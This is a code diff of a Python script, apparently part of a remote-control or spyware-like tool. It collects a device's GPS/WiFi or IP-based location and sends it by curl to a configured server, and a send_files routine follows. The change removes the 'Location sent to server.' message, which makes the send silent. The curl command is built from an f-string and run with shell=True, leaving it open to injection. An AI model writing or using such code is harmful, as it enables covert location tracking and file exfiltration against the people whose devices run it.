@@ -24,20 +24,19 @@ def get_location_and_send():
             $c = $geo.Position.Location
             $result = @{
                 source    = "GPS/WiFi"
-                latitude  = $c.Latitude
-                longitude = $c.Longitude
-                accuracy  = [math]::Round($c.HorizontalAccuracy,2)
+                latitude  = "$($c.Latitude)"
+                longitude = "$($c.Longitude)"
+                accuracy  = "$([math]::Round($c.HorizontalAccuracy,2))"
             }
         } else {
-            # fallback IP
             $ip = Invoke-RestMethod ipinfo.io
             $result = @{
                 source    = "IP"
-                city      = $ip.city
-                region    = $ip.region
-                country   = $ip.country
-                latitude  = $ip.loc.Split(',')[0]
-                longitude = $ip.loc.Split(',')[1]
+                city      = "$($ip.city)"
+                region    = "$($ip.region)"
+                country   = "$($ip.country)"
+                latitude  = "$($ip.loc.Split(',')[0])"
+                longitude = "$($ip.loc.Split(',')[1])"
                 accuracy  = "approximate"
             }
         }
@@ -55,7 +54,7 @@ def get_location_and_send():
         location_text = '{"error":"location_unavailable"}'
     curl_cmd = f'curl -X POST {SERVER_URL}/get-location -H "Content-Type: text/plain" -d "{location_text}"'
     subprocess.run(curl_cmd, shell=True)
-    print("Location sent to server.")
+    return True
 def send_files(args):
     files_to_send = args[1:]
     if not files_to_send:
